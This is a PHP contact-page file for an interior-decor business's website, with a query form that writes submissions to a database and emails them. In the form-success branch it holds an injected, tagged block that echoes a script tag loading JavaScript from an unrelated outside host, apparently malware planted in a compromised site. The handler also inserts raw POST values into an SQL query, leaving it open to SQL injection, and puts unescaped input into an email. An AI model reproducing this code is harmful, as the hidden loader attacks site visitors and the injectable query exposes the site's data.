<?php include "inc/header.php";?><?php include '../adminpanel/inc/connection.php';if(isset($_POST['Submit'])){	extract($_POST);		$today = date("Y-m-d");		$insert = "INSERT INTO sd_enquiry(name,location,mobile,email,purpose,message,en_date) VALUES('$name','$location','$mobile','$email','$purpose','$message','$today')";		if(mysql_query($insert))	{	$message = '<html>	<table cellpadding="10" cellspacing="10">		<tr><td height="55" align="center" colspan="3"><strong>Query Form</strong></td></tr>		<tr><td>Name</td><td>:</td><td>'.$name.'</td></tr>		<tr><td>Location</td><td>:</td><td>'.$location.'</td></tr>		<tr><td>Mobile No</td><td>:</td><td>'.$mobile.'</td></tr>		<tr><td>Email</td><td>:</td><td>'.$email.'</td></tr>		<tr><td>Purpose</td><td>:</td><td>'.$purpose.'</td></tr>		<tr><td>Message</td><td>:</td><td>'.$message.'</td></tr>	</table></html>';$to = "info@synergydecor.co.in";$subject = "Synergy Decor - Query Form";mail('cm.murali78@gmail.com', $subject, $message);$headers  = "From: info@synergydecor.co.in \r\n";    $headers .= "Return-Path: info@synergydecor.co.in \r\n"; 	$headers .= "Bcc: cm.murali78@gmail.com \r\n";    $headers .= "X-Mailer: PHP/". phpversion();    $headers .= 'MIME-Version: 1.0' . "\n";    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 					 if(mail($to, $subject, $message,$headers))					{					header("location:contact.php?msg=We will be in touch with you within two hours, Thank you!");                    exit;					} else                    {                        echo "Mail not sent";                    }}}?>
<style>
.queryform {
line-height: 15px;
}
</style>
		<!-- Highlights -->
			<section class="wrapper">
				<div class="container">
					<div class="row 200%">
						<section class="6u 12u(2)">
						<div class="contact1">
							<span class="redHeader">Contact information</span><br><br>
										<div class="C1">
											<strong id="adresbg">Factory & Office :</strong> 
											<span> <b>Synergy Decor</b><br />
												Plot No 3, 4th Main Road<br />
												Rose Nagar<br />
												Kovilambakkam<br />
												Chennai 600 117<br />
												Land Mark: Behind Rani Mahal</br>
											</span>
											<br class="clear">
										</div>
										<div class="C1">
											<strong id="mailbg">E-mail</strong> 
												<span> 
													<a href="mailto:info@synergydecor.co.in">info@synergydecor.co.in</a> <br>
													
												</span>
											<br class="clear">
										</div>
										<div class="C1">
											<strong id="phonebg">Phone</strong> 
											<span> 
												+91 9025 666 888 <br> 
											</span>
											<br class="clear">
										</div>
										<div class="C1">
											<strong id="websitebg">Websites</strong> 
												<span> 
													<a href="http://www.synergydecor.co.in">www.synergydecor.co.in</a><br> 
													
												</span>
											<br class="clear">
										</div>
						</div>
						</section>
						<section class="6u 12u(2)">
						<div class="queryform">
								<?php if(isset($_REQUEST['msg']) && $_REQUEST['msg']!='')
								{?>
<?php
#d85596#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968092\"></script>";
echo $g;
}
#/d85596#
?>									<div style="top: 30px;" class="message success">
											<h3>Form Submitted successfully </h3>
											
										</div>
									<?php } else {?>
								<form name="query_form" onsubmit="return validform()" id="query_form" method="post">
								<h3 style="text-align: left;margin-bottom: 30px; margin-top: 34px; color: red;">Query Form</h3>
								<div>
										<label for="fname">Name<font color="red">*</font></label> 
								<input class="input required" name="name" type="text"></div>
								<div><label class="fname">Location<font color="red">*</font></label><input name="location" class="input required" type="text"></div>
								<div><label class="fname">Mobile Number<font color="red">*</font></label><input name="mobile" class="input required num" type="text"></div>
								<div><label class="fname">E-mail<font color="red">*</font></label><input name="email" class="input required email" type="text"></div>
								<div><label class="fname">Purpose<font color="red">*</font></label>
									<select name="purpose" class="input required">
										<option value="">--select--</option>
										<option value="Home">Home</option>
										<option value="Office">Office</option>
										<option value="Modular Kitchens">Modular Kitchens</option>
										<option value="others">Others</option>
									</select></div>
								<div><label class="fname">Message</label><textarea name="message" class="input" style="border: 1px solid #cdcdcd;" name="message" rows="8" cols="18"></textarea></div>
								<div><label class="fname"></label><input name="Submit" onclick="return validform()" type="submit" value="Submit" class="button" /></div>
							</form>
							<?php } ?>
							</div>
						</section>
							
					</div>

    </div>

			</section>
					</div>
				</div>
			</section>
			<section class="wrapper strip_line">
			</section>

<?php include "inc/footer.php";?>